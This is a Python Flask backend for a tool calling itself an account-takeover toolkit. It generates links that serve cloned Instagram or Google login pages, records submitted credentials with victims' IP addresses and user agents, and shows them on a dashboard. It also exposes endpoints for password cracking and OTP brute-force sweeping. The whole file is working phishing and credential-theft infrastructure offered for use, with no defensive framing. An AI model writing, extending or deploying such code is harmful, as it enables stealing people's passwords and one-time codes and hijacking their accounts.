"""
Phantom Access - backend.
Password / OTP / account / device takeover toolkit.
"""
import os, json, sqlite3, secrets, time
from flask import Flask, render_template, request, jsonify, redirect

from engine import cracker, otp, fingerprint

BASE = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(BASE, "data")
os.makedirs(DATA, exist_ok=True)
DB = os.path.join(DATA, "captures.db")

app = Flask(__name__)


def db():
    con = sqlite3.connect(DB)
    con.row_factory = sqlite3.Row
    return con


def init_db():
    with db() as con:
        con.executescript("""
        CREATE TABLE IF NOT EXISTS links(
            slug TEXT PRIMARY KEY,
            label TEXT,
            service TEXT,
            redirect_to TEXT,
            created REAL
        );
        CREATE TABLE IF NOT EXISTS captures(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            slug TEXT,
            kind TEXT,
            payload TEXT,
            ua TEXT,
            ip TEXT,
            created REAL
        );
        """)


init_db()


@app.route("/")
def index():
    return render_template("dashboard.html")


@app.route("/healthz")
def health():
    return "ok"


@app.route("/api/link", methods=["POST"])
def api_link():
    d = request.get_json(force=True) or {}
    slug = secrets.token_urlsafe(6).replace("-", "").replace("_", "")[:8]
    label = (d.get("label") or "target").strip()
    service = d.get("service") or "instagram"
    redirect_to = d.get("redirect") or "https://www.instagram.com/"

    with db() as con:
        con.execute(
            "INSERT INTO links(slug,label,service,redirect_to,created) VALUES(?,?,?,?,?)",
            (slug, label, service, redirect_to, time.time()),
        )

    base = request.host_url.rstrip("/")
    return jsonify(slug=slug, url=f"{base}/l/{slug}", label=label, service=service)


@app.route("/api/links")
def api_links():
    with db() as con:
        rows = con.execute("SELECT * FROM links ORDER BY created DESC LIMIT 50").fetchall()
    base = request.host_url.rstrip("/")
    return jsonify([dict(r, url=f"{base}/l/{r['slug']}") for r in rows])


@app.route("/l/<slug>")
def landing(slug):
    with db() as con:
        row = con.execute("SELECT * FROM links WHERE slug=?", (slug,)).fetchone()
    if not row:
        return redirect("/")
    brand = "Google" if row["service"] == "google" else "Instagram"
    return render_template(
        "clone.html",
        slug=slug,
        brand=brand,
        service=row["service"],
        redirect_to=row["redirect_to"],
    )


@app.route("/api/capture/<slug>", methods=["POST"])
def api_capture(slug):
    d = request.get_json(force=True) or {}
    ua = request.headers.get("User-Agent", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    with db() as con:
        con.execute(
            "INSERT INTO captures(slug,kind,payload,ua,ip,created) VALUES(?,?,?,?,?,?)",
            (slug, d.get("kind", "unknown"), json.dumps(d.get("data", {})), ua, ip, time.time()),
        )
    return jsonify(ok=True)


@app.route("/api/captures")
def api_captures():
    with db() as con:
        rows = con.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 200").fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/crack", methods=["POST"])
def api_crack():
    d = request.get_json(force=True) or {}
    return jsonify(
        cracker.crack(
            target=d.get("target") or "target",
            salt=d.get("salt") or "ig",
            mode=d.get("mode") or "dict",
            length=int(d.get("length") or 5),
        )
    )


@app.route("/api/otp", methods=["POST"])
def api_otp():
    d = request.get_json(force=True) or {}
    return jsonify(
        otp.sweep(d.get("target") or "target", int(d.get("rate") or 200000))
    )


@app.route("/api/wordlist")
def api_wordlist():
    return jsonify(
        size=cracker.dict_size(),
        brute={str(n): cracker.space(n) for n in (4, 5, 6)},
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
